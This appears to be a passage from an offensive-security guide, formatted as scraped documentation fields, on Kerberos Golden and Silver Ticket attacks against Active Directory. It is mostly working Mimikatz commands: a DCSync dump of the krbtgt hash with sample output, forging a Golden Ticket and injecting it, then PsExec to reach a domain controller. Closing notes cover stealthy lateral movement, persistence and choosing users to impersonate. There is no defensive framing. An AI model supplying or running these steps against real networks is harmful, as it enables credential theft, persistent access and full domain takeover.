mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

Output:

NTLM: 1693c6cefafffc7af11ef34d1c788f47

docs.title: Step 2: Forge Ticket with Mimikatz
docs.text:
kerberos::golden /user:administrator /domain:corp.local /sid:<domain-sid> /krbtgt:<hash> /ptt

Example:

mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234... /krbtgt:1693c6ce... /ptt

docs.title: Step 3: Use the Ticket
docs.text:
Check:

klist

Access high-priv systems:

PsExec.exe \\dc01 cmd.exe

If the Golden Ticket is valid, this gives full domain admin access.

docs.title: Summary: Silver vs. Golden Tickets
docs.text: Feature Silver Ticket Golden Ticket Forged Ticket TGS TGT Scope Single host/service Entire domain Key Needed NTLM hash of service account NTLM hash of krbtgt account Tools Mimikatz Mimikatz DC Interaction None Yes (DC accepts forged TGT) Use Cases Access file shares, RDP, HTTP services Domain Admin, DCSync, unrestricted impersonation

docs.title: Notes
docs.text:
• Forge Silver Tickets for stealthy lateral movement

  • Forge Golden Tickets for domain persistence or privilege escalation

  • Use BloodHound or net group "Domain Admins" to identify ideal users to impersonate

  • kerberos::ptt can be used independently to inject any .kirbi ticket

docs.title: References
docs.text:
